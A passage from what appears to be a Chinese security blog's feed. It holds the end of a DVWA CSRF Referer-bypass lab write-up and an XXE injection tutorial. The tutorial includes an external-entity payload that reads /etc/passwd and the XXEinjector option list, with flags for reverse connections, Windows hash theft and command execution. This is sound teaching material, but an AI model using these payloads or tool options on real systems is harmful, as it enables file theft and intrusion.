&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Didn&amp;#39;t come from a trusted source
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;That request didn&amp;#39;t look correct.&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;is_null&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_close&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]))) ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt; : $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以看到，后台源码只判断referer中是否存在含有DVWA网站地址的字符串&lt;br &#x2F;&gt;这里只需要将我们的钓鱼网页的名称改为目标网站的地址即可绕过&lt;br &#x2F;&gt;这里burp怎么也抓不到包，借用margin视频中的截图&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624384064585-272baa24-1ffd-4fa8-ba76-cf79071327f6.png#align=left&amp;amp;display=inline&amp;amp;height=886&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.47.30.png&amp;amp;originHeight=886&amp;amp;originWidth=1372&amp;amp;size=766843&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1372&quot; alt=&quot;截屏2021-06-23 上午1.47.30.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;请看包中的referer值&lt;&#x2F;p&gt;
&lt;h1 id=&quot;igamingba-chang&quot;&gt;igaming靶场&lt;&#x2F;h1&gt;
&lt;p&gt;这个cms我安装失败了……&lt;br &#x2F;&gt;不过利用方法跟上面那个相同，只不过GET请求，变成了POST请求&lt;&#x2F;p&gt;
&lt;h1 id=&quot;espcmsba-chang&quot;&gt;ESPCMS靶场&lt;&#x2F;h1&gt;
&lt;p&gt;我累了，不想安装这个了……&lt;br &#x2F;&gt;利用方法与上面igaming相同&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>XXE-XML注入</title>
		<published>2021-06-17T00:00:00+00:00</published>
		<updated>2021-06-17T00:00:00+00:00</updated>
		<link href="https://baz.ee/xxe-xmlzhu-ru/" type="text/html"/>
		<id>https://baz.ee/xxe-xmlzhu-ru/</id>
		<content type="html">&lt;h1 id=&quot;xml-dtdde-ji-ben-shi-yong-fang-fa&quot;&gt;XML+DTD的基本使用方法&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;shi-yao-shi-xml&quot;&gt;什么是XML&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;XML指可扩展标记语言（EXtensible Markup Language）&lt;&#x2F;li&gt;
&lt;li&gt;XML是一种很像HTML的标记语言&lt;&#x2F;li&gt;
&lt;li&gt;XML的设计宗旨是传输数据，而不是显示数据&lt;&#x2F;li&gt;
&lt;li&gt;XML标签没有被预定义，需要自行定义标签&lt;&#x2F;li&gt;
&lt;li&gt;XML被设计为具有自我描述性&lt;&#x2F;li&gt;
&lt;li&gt;XML是W3C的推荐标准&lt;&#x2F;li&gt;
&lt;li&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623917284931-12f801e6-99f2-4b30-bdad-580eed973657.png#align=left&amp;amp;display=inline&amp;amp;height=292&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.07.53.png&amp;amp;originHeight=744&amp;amp;originWidth=836&amp;amp;size=398015&amp;amp;status=done&amp;amp;style=none&amp;amp;width=328&quot; alt=&quot;截屏2021-06-17 下午4.07.53.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;需要注意的是：XML不会做任何事情，它仅仅是包装在XML标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;xmlyong-tu&quot;&gt;XML用途&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;简化数据共享&lt;&#x2F;li&gt;
&lt;li&gt;简化数据传输&lt;&#x2F;li&gt;
&lt;li&gt;简化平台变更&lt;&#x2F;li&gt;
&lt;li&gt;使数据更加有用&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;shi-yao-shi-dtd&quot;&gt;什么是DTD&lt;&#x2F;h2&gt;
&lt;p&gt;定义：DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。&lt;br &#x2F;&gt;作用：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;一个应用程序也可以使用DTD来确认从DTD收到的数据是有效的&lt;&#x2F;li&gt;
&lt;li&gt;每个XML文件可以携带一个自身格式的描述&lt;&#x2F;li&gt;
&lt;li&gt;不同组织的人可以使用一个通用DTD来交换数据&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;dtdfen-lei&quot;&gt;DTD分类&lt;&#x2F;h2&gt;
&lt;p&gt;内部DTD&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623918218039-510d635d-1ae1-4ff6-97be-a1b75a8f5137.png#align=left&amp;amp;display=inline&amp;amp;height=246&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.23.21.png&amp;amp;originHeight=552&amp;amp;originWidth=1038&amp;amp;size=448655&amp;amp;status=done&amp;amp;style=none&amp;amp;width=462&quot; alt=&quot;截屏2021-06-17 下午4.23.21.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;外部DTD&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623918272629-dc623c1d-7055-48a7-ba3b-ac3d9f93bf03.png#align=left&amp;amp;display=inline&amp;amp;height=197&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.24.20.png&amp;amp;originHeight=552&amp;amp;originWidth=1300&amp;amp;size=525269&amp;amp;status=done&amp;amp;style=none&amp;amp;width=463&quot; alt=&quot;截屏2021-06-17 下午4.24.20.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;公有DTD&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623918341001-e4dcf711-500b-4cef-874f-1bf73dbeff47.png#align=left&amp;amp;display=inline&amp;amp;height=40&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.25.30.png&amp;amp;originHeight=124&amp;amp;originWidth=2448&amp;amp;size=322609&amp;amp;status=done&amp;amp;style=none&amp;amp;width=792&quot; alt=&quot;截屏2021-06-17 下午4.25.30.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dtdshi-ti&quot;&gt;DTD实体&lt;&#x2F;h2&gt;
&lt;p&gt;内部实体&lt;br &#x2F;&gt;&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623918660673-8aac5b03-0174-43bd-9f7a-c938d4d46e5a.png#align=left&amp;amp;display=inline&amp;amp;height=120&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.30.48.png&amp;amp;originHeight=282&amp;amp;originWidth=896&amp;amp;size=196818&amp;amp;status=done&amp;amp;style=none&amp;amp;width=381&quot; alt=&quot;截屏2021-06-17 下午4.30.48.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;外部实体&lt;br &#x2F;&gt;&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623918777670-f60a9a13-df29-49c4-8b8a-24acd0115652.png#align=left&amp;amp;display=inline&amp;amp;height=136&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.32.44.png&amp;amp;originHeight=310&amp;amp;originWidth=868&amp;amp;size=227080&amp;amp;status=done&amp;amp;style=none&amp;amp;width=380&quot; alt=&quot;截屏2021-06-17 下午4.32.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;参数实体&lt;br &#x2F;&gt;&lt;!ENTITY % 实体名称 [SYSTEM] &quot;URL&quot;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623918874001-9a7c61b3-93cd-4f5f-b4e7-d2ef04d7bab8.png#align=left&amp;amp;display=inline&amp;amp;height=77&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.34.25.png&amp;amp;originHeight=208&amp;amp;originWidth=1032&amp;amp;size=134757&amp;amp;status=done&amp;amp;style=none&amp;amp;width=381&quot; alt=&quot;截屏2021-06-17 下午4.34.25.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;参数实体只能在DTD中定义，DTD中引用&lt;&#x2F;li&gt;
&lt;li&gt;参数实体和通用实体一样，参数实体也可以外部引用&lt;&#x2F;li&gt;
&lt;li&gt;实体的声明中不能引用其他参数实体&lt;&#x2F;li&gt;
&lt;li&gt;非参数实体只能在DTD中定义，在xml文档中引用&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;dtdyuan-su&quot;&gt;DTD元素&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623919505307-0ebe69ed-fbd4-4b9f-b55e-7be384f2b15b.png#align=left&amp;amp;display=inline&amp;amp;height=960&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.44.55.png&amp;amp;originHeight=960&amp;amp;originWidth=2186&amp;amp;size=400979&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2186&quot; alt=&quot;截屏2021-06-17 下午4.44.55.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dtdde-shi-yong&quot;&gt;DTD的使用&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623919725924-3036e7cc-093c-470d-b0a5-cb79d90ca0dc.png#align=left&amp;amp;display=inline&amp;amp;height=614&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.47.48.png&amp;amp;originHeight=1246&amp;amp;originWidth=1128&amp;amp;size=1072736&amp;amp;status=done&amp;amp;style=none&amp;amp;width=556&quot; alt=&quot;截屏2021-06-17 下午4.47.48.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623919749398-2ecc4d9e-726c-4224-9099-a322c3db1eae.png#align=left&amp;amp;display=inline&amp;amp;height=321&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.48.03.png&amp;amp;originHeight=724&amp;amp;originWidth=1264&amp;amp;size=592639&amp;amp;status=done&amp;amp;style=none&amp;amp;width=560&quot; alt=&quot;截屏2021-06-17 下午4.48.03.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623919775613-1fd20acd-9959-4e37-9241-35ed837b3323.png#align=left&amp;amp;display=inline&amp;amp;height=184&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.48.33.png&amp;amp;originHeight=416&amp;amp;originWidth=1260&amp;amp;size=340665&amp;amp;status=done&amp;amp;style=none&amp;amp;width=558&quot; alt=&quot;截屏2021-06-17 下午4.48.33.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xxelou-dong-yuan-li&quot;&gt;XXE漏洞原理&lt;&#x2F;h1&gt;
&lt;p&gt;XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。如果开发人员在开发时允许引用外部实体时，恶意用户便会利用这一漏洞构造恶意语句，从而引发文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，可见其危害之大。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623929799912-1e4bc587-ea73-4bf7-ad88-4d0e9740030b.png#align=left&amp;amp;display=inline&amp;amp;height=218&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.36.27.png&amp;amp;originHeight=560&amp;amp;originWidth=1064&amp;amp;size=287717&amp;amp;status=done&amp;amp;style=none&amp;amp;width=414&quot; alt=&quot;截屏2021-06-17 下午7.36.27.png&quot; &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624115596592-0a5c9513-a254-4e49-8784-91590dd5297a.png#align=left&amp;amp;display=inline&amp;amp;height=253&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=519&amp;amp;originWidth=857&amp;amp;size=142117&amp;amp;status=done&amp;amp;style=none&amp;amp;width=417&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;**XXE注入的主要利用点是 **&lt;strong&gt;外部实体&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xxelou-dong-fen-lei-an-gou-zao-wai-bu-shi-ti-sheng-ming&quot;&gt;XXE漏洞分类（按构造外部实体声明）&lt;&#x2F;h1&gt;
&lt;ol&gt;
&lt;li&gt;直接通过DTD外部实体声明&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623930146397-482d3699-2356-404b-a16a-afd691668fb4.png#align=left&amp;amp;display=inline&amp;amp;height=100&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.41.30.png&amp;amp;originHeight=368&amp;amp;originWidth=1568&amp;amp;size=274496&amp;amp;status=done&amp;amp;style=none&amp;amp;width=427&quot; alt=&quot;截屏2021-06-17 下午7.41.30.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Margin.dtd文件内容&lt;br &#x2F;&gt;&lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;通过DTD文档引入外部DTD文档中的外部实体声明&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623930314869-205ecb8e-c744-4300-8316-44bb1bac4ef3.png#align=left&amp;amp;display=inline&amp;amp;height=49&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.41.48.png&amp;amp;originHeight=186&amp;amp;originWidth=2256&amp;amp;size=289702&amp;amp;status=done&amp;amp;style=none&amp;amp;width=593&quot; alt=&quot;截屏2021-06-17 下午7.41.48.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;通过DTD外部实体声明引入外部文档中的外部实体声明&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623930404422-ab134fca-613d-4cc7-afe3-03a272283dbb.png#align=left&amp;amp;display=inline&amp;amp;height=79&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.42.05.png&amp;amp;originHeight=324&amp;amp;originWidth=2068&amp;amp;size=348584&amp;amp;status=done&amp;amp;style=none&amp;amp;width=502&quot; alt=&quot;截屏2021-06-17 下午7.42.05.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xxelou-dong-fen-lei&quot;&gt;XXE漏洞分类&lt;&#x2F;h1&gt;
&lt;ol&gt;
&lt;li&gt;正常回显XXE&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;正常回显XXE是最传统的XXE攻击，在利用过程中服务器会直接回显信息，可直接完成XXE攻击。&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;报错XXE&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;报错XXE是回显XXE攻击的一种特例，它与正常回显XXE的不同在于它在利用过程中服务器回显的是错误信息，可根据错误信息的不同判断是否注入成功。&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;Blind XXE&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;当服务器没有回显，我们可以选择使用Blind XXE。与前两种XXE不同之处在于Blind XXE无回显信息，可组合利用file协议来读取文件或http协议和ftp协议来查看日志&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xxede-wei-hai&quot;&gt;XXE的危害&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;du-qu-ren-yi-wen-jian&quot;&gt;读取任意文件&lt;&#x2F;h2&gt;
&lt;p&gt;PHP中可以通过file协议、http协议和ftp协议读取文件，还可以利用PHP伪协议。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623932049221-ca0e87d9-73af-4838-a183-d1b13166e17e.png#align=left&amp;amp;display=inline&amp;amp;height=103&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.13.49.png&amp;amp;originHeight=356&amp;amp;originWidth=1566&amp;amp;size=298968&amp;amp;status=done&amp;amp;style=none&amp;amp;width=454&quot; alt=&quot;截屏2021-06-17 下午8.13.49.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623932094518-1443e3c4-c78f-40c8-9566-6f91f75d0fff.png#align=left&amp;amp;display=inline&amp;amp;height=155&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.14.40.png&amp;amp;originHeight=582&amp;amp;originWidth=1694&amp;amp;size=1594704&amp;amp;status=done&amp;amp;style=none&amp;amp;width=452&quot; alt=&quot;截屏2021-06-17 下午8.14.40.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;zhi-xing-xi-tong-ming-ling&quot;&gt;执行系统命令&lt;&#x2F;h2&gt;
&lt;p&gt;这种情况很少发生，但在配置不当&#x2F;开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623932484573-1c34c559-5b41-4cde-b504-547c3ee52655.png#align=left&amp;amp;display=inline&amp;amp;height=124&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.21.11.png&amp;amp;originHeight=362&amp;amp;originWidth=1316&amp;amp;size=290238&amp;amp;status=done&amp;amp;style=none&amp;amp;width=452&quot; alt=&quot;截屏2021-06-17 下午8.21.11.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;nei-wang-duan-kou-tan-ce&quot;&gt;内网端口探测&lt;&#x2F;h2&gt;
&lt;p&gt;可根据返回信息内容判断该端口是否打开。若测试端口返回“Connection refused”，则可以知道该端口是closed的，否则为open。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623932694797-eca2f894-7abc-4d8e-8875-d17ad08dbf3b.png#align=left&amp;amp;display=inline&amp;amp;height=134&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.24.33.png&amp;amp;originHeight=570&amp;amp;originWidth=1926&amp;amp;size=520421&amp;amp;status=done&amp;amp;style=none&amp;amp;width=454&quot; alt=&quot;截屏2021-06-17 下午8.24.33.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;jarxie-yi-shang-chuan-wen-jian&quot;&gt;jar协议上传文件&lt;&#x2F;h2&gt;
&lt;p&gt;jar协议语法    jar:{url}!&#x2F;{entry}&lt;br &#x2F;&gt;url是文件的路径，entry是想要解压出来的文件&lt;br &#x2F;&gt;jar协议处理文件的过程：下载jar&#x2F;zip文件到临时文件中提取出我们指定的文件删除临时文件&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623933204568-64d2740d-9839-4d08-8965-a5006dc6ef75.png#align=left&amp;amp;display=inline&amp;amp;height=77&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.33.09.png&amp;amp;originHeight=338&amp;amp;originWidth=2276&amp;amp;size=413186&amp;amp;status=done&amp;amp;style=none&amp;amp;width=518&quot; alt=&quot;截屏2021-06-17 下午8.33.09.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xxeli-yong-gong-ju-xxeinjector&quot;&gt;XXE利用工具-XXEinjector&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623933410378-67e801c6-ec16-4d57-8bcc-3f34ce3e980a.png#align=left&amp;amp;display=inline&amp;amp;height=1270&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.36.34.png&amp;amp;originHeight=1270&amp;amp;originWidth=2566&amp;amp;size=1133272&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2566&quot; alt=&quot;截屏2021-06-17 下午8.36.34.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;--host           必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
&lt;&#x2F;span&gt;&lt;span&gt;--file           必填项- 包含有效HTTP请求的XML文件。(--file=&#x2F;tmp&#x2F;req.txt)
&lt;&#x2F;span&gt;&lt;span&gt;--path           必填项-是否需要枚举目录 – 枚举路径。(--path=&#x2F;etc)
&lt;&#x2F;span&gt;&lt;span&gt;--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=&#x2F;tmp&#x2F;brute.txt)
&lt;&#x2F;span&gt;&lt;span&gt;--logger         记录输出结果。
&lt;&#x2F;span&gt;&lt;span&gt;--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
&lt;&#x2F;span&gt;&lt;span&gt;--rport          远程主机的TCP端口信息。(--rport=8080)
&lt;&#x2F;span&gt;&lt;span&gt;--phpfilter      在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
&lt;&#x2F;span&gt;&lt;span&gt;--netdoc         使用netdoc协议。(Java).
&lt;&#x2F;span&gt;&lt;span&gt;--enumports      枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
&lt;&#x2F;span&gt;&lt;span&gt;--hashes         窃取运行当前应用程序用户的Windows哈希。
&lt;&#x2F;span&gt;&lt;span&gt;--expect         使用PHP expect扩展执行任意系统命令。(--expect=ls)
&lt;&#x2F;span&gt;&lt;span&gt;--upload         使用Java jar向临时目录上传文件。(--upload=&#x2F;tmp&#x2F;upload.txt)
&lt;&#x2F;span&gt;&lt;span&gt;--xslt           XSLT注入测试。
&lt;&#x2F;span&gt;&lt;span&gt;--ssl            使用SSL。
&lt;&#x2F;span&gt;&lt;span&gt;--proxy          使用代理。(--proxy=127.0.0.1:8080)
&lt;&#x2F;span&gt;&lt;span&gt;--httpport       自定义HTTP端口。(--httpport=80)
&lt;&#x2F;span&gt;&lt;span&gt;--ftpport        设置自定义FTP端口。(--ftpport=21)
&lt;&#x2F;span&gt;&lt;span&gt;--gopherport     设置自定义gopher端口。(--gopherport=70)
&lt;&#x2F;span&gt;&lt;span&gt;--jarport        设置自定义文件上传端口。(--jarport=1337)
&lt;&#x2F;span&gt;&lt;span&gt;--xsltport       设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
&lt;&#x2F;span&gt;&lt;span&gt;--test           该模式可用于测试请求的有效。
&lt;&#x2F;span&gt;&lt;span&gt;--urlencode      URL编码，默认为URI。
&lt;&#x2F;span&gt;&lt;span&gt;--output         爆破攻击结果输出和日志信息。(--output=&#x2F;tmp&#x2F;out.txt)
&lt;&#x2F;span&gt;&lt;span&gt;--timeout        设置接收文件&#x2F;目录内容的Timeout。(--timeout=20)
